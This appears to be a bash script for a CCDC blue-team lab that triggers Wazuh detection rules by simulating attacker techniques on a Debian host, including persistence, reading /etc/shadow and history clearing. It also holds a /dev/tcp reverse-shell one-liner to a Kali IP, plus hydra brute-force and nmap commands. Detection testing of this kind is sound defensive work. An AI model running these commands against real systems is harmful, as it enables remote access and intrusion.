#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/lib/common.sh"

require_root

KALI_IP="${1:-}"
if [[ -z "$KALI_IP" ]]; then
    read -r -p "Enter Kali IP (for reverse shell / network tests): " KALI_IP
fi
DEBIAN_IP="$(hostname -I | awk '{print $1}')"

pause_for_kali() {
    local prompt="$1"
    printf '\n[KALI ACTION] %s\n' "$prompt"
    read -r -p "Press Enter once done on Kali (or type 'skip' to skip): " ans
    [[ "${ans,,}" != "skip" ]]
}

log_step "1. Host Discovery (102013)"
whoami >/dev/null
uname -a >/dev/null
cat /etc/passwd >/dev/null
ss -tulpn >/dev/null
log_ok "Discovery commands executed."

log_step "2. Temp-Directory & Hidden Dot-Directory Execution (102008, 102022)"
printf '#!/bin/sh\nid >/dev/null\n' > /tmp/redteam_bin.sh
chmod +x /tmp/redteam_bin.sh
/tmp/redteam_bin.sh
rm -f /tmp/redteam_bin.sh

mkdir -p /tmp/.ccdc_hidden
printf '#!/bin/sh\nid >/dev/null\n' > /tmp/.ccdc_hidden/run.sh
chmod +x /tmp/.ccdc_hidden/run.sh
/tmp/.ccdc_hidden/run.sh
rm -rf /tmp/.ccdc_hidden
log_ok "Temp and hidden-dir executions completed."

log_step "3. Parent -> Shell Reverse Shell Pattern (102018)"
python3 -c 'import subprocess; subprocess.run(["/bin/sh", "-c", "id >/dev/null"])'
log_ok "Parent->shell test completed."

log_step "4. Persistence, su to root & Account Manipulation (102001, 102004, 102006, 102010, 102030)"
su - root -c "id >/dev/null" 2>/dev/null || true
touch /etc/cron.d/redteam_test
useradd testred 2>/dev/null || true
mkdir -p /root/.ssh
touch /root/.ssh/authorized_keys
mkdir -p /var/spool/cron
touch /var/spool/cron/redteam_test
sleep 2
rm -f /etc/cron.d/redteam_test /var/spool/cron/redteam_test
userdel testred 2>/dev/null || true
find /root/.ssh -maxdepth 1 -name authorized_keys -empty -delete 2>/dev/null || true
log_ok "Persistence & user tests completed and cleaned up."

log_step "5. /etc/shadow Read & SUID Abuse (102012)"
cat /etc/shadow >/dev/null
cp /bin/true /tmp/suid_test
chmod +s /tmp/suid_test
rm -f /tmp/suid_test
log_ok "Shadow & SUID tests completed."

log_step "6. Archive Staging (102014)"
tar -czf /tmp/loot_test.tar.gz /etc/passwd 2>/dev/null
rm -f /tmp/loot_test.tar.gz
log_ok "Archive staging test completed."

log_step "7. Package Management (102005)"
if command -v apt-get >/dev/null 2>&1; then
    apt-get install -y -qq sl >/dev/null 2>&1 && apt-get remove -y -qq sl >/dev/null 2>&1 || true
fi
log_ok "Package management test completed."

log_step "8. Tampering, Rootkit, Download, Keylogger & Password Audit (102031, 102032, 102033, 102034, 102038)"
bash -c 'unset HISTFILE; history -c' >/dev/null 2>&1 || true
modprobe -n dummy >/dev/null 2>&1 || true
curl -s -o /tmp/ccdc_dl_test http://127.0.0.1:9 >/dev/null 2>&1 || true
rm -f /tmp/ccdc_dl_test
if command -v strace >/dev/null 2>&1; then
    strace -p 999999 >/dev/null 2>&1 || true
else
    ls /dev/input/event0 >/dev/null 2>&1 || true
fi
passwd -S root >/dev/null 2>&1 || true
log_ok "Tampering, LKM, download, keylogger, and password audit tests completed."

if pause_for_kali "Start a listener on Kali:  nc -lvnp 4444"; then
    log_step "8. Reverse Shell Test (102009)"
    timeout 4 bash -c "bash -i >& /dev/tcp/${KALI_IP}/4444 0>&1" 2>/dev/null || true
    log_ok "Reverse shell test sent."
fi

pause_for_kali "Run SSH brute force & Nmap scan on Kali:
  hydra -l fakeuser -P /usr/share/wordlists/fasttrack.txt -t 4 -f ssh://${DEBIAN_IP}
  nmap -Pn -p 1-50 ${DEBIAN_IP}" || true

if [[ -f /etc/ssh/sshd_config ]]; then
    ORIG_PERMIT="$(grep -E '^#?PermitRootLogin' /etc/ssh/sshd_config | head -n1 || true)"
    read -r -p "Test Root SSH login (102003)? Temporarily sets PermitRootLogin yes (Enter=yes / 'skip'): " ans
    if [[ "${ans,,}" != "skip" ]]; then
        sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
        systemctl restart ssh 2>/dev/null || systemctl restart sshd 2>/dev/null || true
        pause_for_kali "Run on Kali:  ssh root@${DEBIAN_IP}" || true
        if [[ -n "$ORIG_PERMIT" ]]; then
            sed -i "s|^PermitRootLogin yes|${ORIG_PERMIT}|" /etc/ssh/sshd_config
        else
            sed -i 's/^PermitRootLogin yes/PermitRootLogin prohibit-password/' /etc/ssh/sshd_config
        fi
        systemctl restart ssh 2>/dev/null || systemctl restart sshd 2>/dev/null || true
        log_ok "Reverted PermitRootLogin."
    fi
fi

log_step "Summary: Recent CCDC Rule IDs in alerts.log (if running on manager)"
if [[ -f /var/ossec/logs/alerts/alerts.log ]]; then
    grep -oE 'Rule: 102[0-9]{3}' /var/ossec/logs/alerts/alerts.log | sort -u || true
fi
log_ok "All Linux detection tests finished. Check Threat Hunting -> Events in the Dashboard."
